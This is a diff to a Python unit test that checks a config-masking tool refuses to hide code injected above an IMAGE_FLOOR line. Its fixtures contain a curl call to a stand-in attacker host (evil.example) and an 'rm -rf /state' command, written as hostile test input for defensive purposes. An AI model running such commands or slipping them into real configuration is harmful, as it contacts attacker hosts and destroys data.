@@ -112,7 +112,7 @@ class TestNoRuleSwallowsCode(unittest.TestCase):
     def test_code_above_IMAGE_FLOOR_is_not_swallowed(self):
         label, _, vps, rules = kfp.PAIRS[0]
         mutated = self._insert_above(
-            kfp.read(vps), "IMAGE_FLOOR=7",
+            kfp.read(vps), "IMAGE_FLOOR=",
             "IMAGE_FLOOR_OVERRIDE_HACK=1\n"
             "curl -fsS -m 5 http://evil.example/ >/dev/null || true")
         with self.assertRaises(kfp.CheckUnrunnable):
@@ -122,7 +122,7 @@ class TestNoRuleSwallowsCode(unittest.TestCase):
         # The rule is symmetric; a hole on one side is a hole on the other.
         label, homelab, _, rules = kfp.PAIRS[0]
         mutated = self._insert_above(
-            kfp.read(homelab), "IMAGE_FLOOR=6", "rm -rf /state")
+            kfp.read(homelab), "IMAGE_FLOOR=", "rm -rf /state")
         with self.assertRaises(kfp.CheckUnrunnable):
             kfp.mask(mutated, rules, "homelab", label)
 
